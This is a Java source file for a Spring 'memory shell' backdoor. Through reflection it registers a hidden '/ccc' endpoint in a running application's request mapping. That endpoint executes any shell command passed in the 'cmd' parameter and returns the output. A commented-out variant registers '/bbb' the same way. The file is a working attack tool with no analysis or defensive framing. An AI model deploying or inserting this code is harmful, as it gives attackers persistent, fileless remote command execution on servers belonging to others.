import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.util.pattern.PathPattern;
import org.springframework.web.util.pattern.PathPatternParser;

import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringRequestMappingMemshell {
    public static String doInject() {
        String msg = "inject-start";

        try {
//            //无参数doInject()
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean("requestMappingHandlerMapping");
            Method registerHandlerMethod = abstractHandlerMapping.getClass().getDeclaredMethod("registerHandlerMethod", Object.class, Method.class, RequestMappingInfo.class);
            registerHandlerMethod.setAccessible(true);
            Method executeCommand = SpringRequestMappingMemshell.class.getDeclaredMethod("executeCommand", String.class);
            PathPattern pathPattern = new PathPatternParser().parse("/ccc");
            PatternsRequestCondition patternsRequestCondition = new PatternsRequestCondition(String.valueOf(pathPattern));
            RequestMappingInfo requestMappingInfo = new RequestMappingInfo("", patternsRequestCondition, null, null, null, null, null, null);
            registerHandlerMethod.invoke(abstractHandlerMapping, new SpringRequestMappingMemshell(), executeCommand, requestMappingInfo);

            //doInject(Object requestMappingHandlerMapping)
//            Method registerHandlerMethod = requestMappingHandlerMapping.getClass().getDeclaredMethod("registerHandlerMethod", Object.class, Method.class, RequestMappingInfo.class);
//            registerHandlerMethod.setAccessible(true);
//            Method executeCommand = SpringRequestMappingMemshell.class.getDeclaredMethod("executeCommand", String.class);
//            PathPattern pathPattern = new PathPatternParser().parse("/bbb");
//            PatternsRequestCondition patternsRequestCondition = new PatternsRequestCondition(String.valueOf(pathPattern));
//            RequestMappingInfo requestMappingInfo = new RequestMappingInfo("", patternsRequestCondition, null, null, null, null, null, null);
//            registerHandlerMethod.invoke(requestMappingHandlerMapping, new SpringRequestMappingMemshell(), executeCommand, requestMappingInfo);


            msg = "inject-success";
        }catch (Exception e){
            msg = "inject-error";
        }
        return msg;
    }

    public ResponseEntity executeCommand(@RequestParam("cmd") String cmd) throws IOException {
        String execResult = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
        return new ResponseEntity(execResult, HttpStatus.OK);
    }
}